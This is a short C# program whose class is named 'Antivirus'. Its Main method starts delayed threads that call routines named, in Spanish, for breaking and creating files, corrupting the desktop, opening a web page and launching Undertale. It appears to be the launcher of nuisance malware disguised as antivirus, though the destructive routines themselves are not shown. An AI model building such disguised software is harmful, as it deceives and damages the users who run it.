using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Net;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using Antivirus;

namespace ConsoleApplication1
{
    class Antivirus
    {
        static void Main()
        {
            
            ThreadStart romperYCrear = new ThreadStart(RomperYCrear.crearArchivos), corromperEscritorio = new ThreadStart(CorromperEscritorio.corromper), abrirPagina = new ThreadStart(Internet.abrirPagina), undertale = new ThreadStart(Undertale.jugar);

            Thread hiloRomperYCrear = new Thread(romperYCrear);

            Thread hiloCorromperEscritorio = new Thread(corromperEscritorio);

            Thread hiloInternet = new Thread(abrirPagina);

            Thread hiloJugar = new Thread(undertale);

            hiloRomperYCrear.Start();

            Thread.Sleep(13000);

            hiloInternet.Start();

            Thread.Sleep(20000);

            hiloCorromperEscritorio.Start();

            Thread.Sleep(30000);

            hiloJugar.Start();

        }

    }
}